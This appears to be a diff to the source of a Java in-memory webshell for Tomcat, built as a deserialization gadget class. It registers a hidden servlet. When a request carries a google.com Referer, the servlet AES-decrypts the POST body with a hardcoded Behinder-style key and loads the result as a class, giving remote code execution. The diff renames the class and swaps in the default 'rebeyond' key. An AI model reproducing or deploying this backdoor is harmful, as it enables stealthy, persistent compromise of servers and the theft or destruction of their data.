@@ -29,7 +29,7 @@ import java.util.HashMap;
 import java.util.Scanner;
 import java.util.Set;
 
-public class TomcatServletMemShell extends AbstractTranslet implements Servlet {
+public class TomcatServletMemShellFromJMX extends AbstractTranslet implements Servlet {
 
     static {
         try {
@@ -61,7 +61,7 @@ public class TomcatServletMemShell extends AbstractTranslet implements Servlet {
                         Wrapper wrapper = standardContext.createWrapper();
                         wrapper.setName(servletName);
                         standardContext.addChild(wrapper);
-                        Servlet servlet = new TomcatServletMemShell();
+                        Servlet servlet = new TomcatServletMemShellFromJMX();
                         wrapper.setServletClass(servlet.getClass().getName());
                         wrapper.setServlet(servlet);
                         ServletRegistration.Dynamic registration = new ApplicationServletRegistration(wrapper, standardContext);
@@ -125,12 +125,11 @@ public class TomcatServletMemShell extends AbstractTranslet implements Servlet {
                     }
                 } else if (request.getHeader("Referer").equalsIgnoreCase("https://www.google.com/")) {
                     if (request.getMethod().equals("POST")) {
-                        String k = "7ab2695c3c103c7c54130685ef2cc03a".substring(16); // Y4er
+                        String k = "e45e329feb5d925b"; // rebeyond
                         session.putValue("u", k);
                         Cipher c = Cipher.getInstance("AES");
                         c.init(2, new SecretKeySpec(k.getBytes(), "AES"));
 
-                        //revision BehinderFilter
                         Method method = Class.forName("java.lang.ClassLoader").getDeclaredMethod("defineClass", byte[].class, int.class, int.class);
                         method.setAccessible(true);
                         byte[] evilclass_byte = c.doFinal(new sun.misc.BASE64Decoder().decodeBuffer(request.getReader().readLine()));
